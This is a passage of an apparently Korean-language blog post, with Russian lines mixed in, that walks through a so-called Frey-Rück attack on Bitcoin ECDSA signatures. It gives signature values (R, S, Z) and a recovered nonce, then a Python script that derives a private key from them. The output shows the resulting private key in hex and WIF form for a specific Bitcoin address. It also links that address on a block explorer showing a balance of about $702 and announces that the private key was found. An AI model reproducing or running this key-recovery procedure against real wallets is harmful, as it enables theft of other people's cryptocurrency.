<p><code>(0x902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e , 0x41034db92068cdccccf81bf9d103a8abe6f64f4df764b3fb2962fdf7ff86fa0d)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>시그니처 값으로&nbsp;포인트 좌표 확인<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e
S = 0x01bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc
Z = 0x74bd6032e6bfd019a0760d799efc145c34b9a5d58e9f974f9a60756890dc6288</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0x902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e
point2gen  =   (0x902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e , 0x41034db92068cdccccf81bf9d103a8abe6f64f4df764b3fb2962fdf7ff86fa0d)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0x0a27007da4d867c8ec6847cab32e8b8c38f5df48ec73847d355b4c7479970b99</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 비밀 키를 알고 있으므로 비트코인 ​​지갑에 대한 개인 키를 얻을 수 있습니다.<code>19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>Python</em>&nbsp;스크립트를 사용합시다&nbsp;&nbsp;.&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 개인 키 가져오기</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>코드를 열고 서명의 모든 값을 추가합시다<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x0a27007da4d867c8ec6847cab32e8b8c38f5df48ec73847d355b4c7479970b99
R = 0x902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e
S = 0x01bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc
Z = 0x74bd6032e6bfd019a0760d799efc145c34b9a5d58e9f974f9a60756890dc6288


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>스크립트는 다음 공식을 사용하여 개인 키를 계산합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>스크립트를 실행해 봅시다:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1089} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-95.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1089"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 4c708ac0c78e07552f14544758031d2ad9d0baee702b5b163b97f1e7200c007b</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress를</a></strong>&nbsp;열고&nbsp;다음을 확인합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac
WIF:  KynJKoLwF9vk8yV5HaEybRcmjQhV938rjKt5kV6A7omrVipvk9ve
HEX:  4c708ac0c78e07552f14544758031d2ad9d0baee702b5b163b97f1e7200c007b</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":912} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/a5.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-912"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":914} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-26-1024x444.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-914"/><figcaption class="wp-element-caption"><strong><code>www.blockchain.com/btc/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 702.32</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/14FreyRuckAttack" target="_blank" rel="noreferrer noopener">원천</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://attacksafe.ru/software" target="_blank" rel="noreferrer noopener">공격에 안전한 소프트웨어</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">텔레그램: https://t.me/cryptodeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/wqHES7r1qyc" target="_blank" rel="noreferrer noopener">영상 자료: https://youtu.be/wqHES7r1qyc</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/frey-ruck-attack" target="_blank" rel="noreferrer noopener">출처: https://cryptodeep.ru/frey-ruck-attack</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":1100} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/018-1024x576.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1100"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">암호해독</a></p>
<!-- /wp:paragraph -->
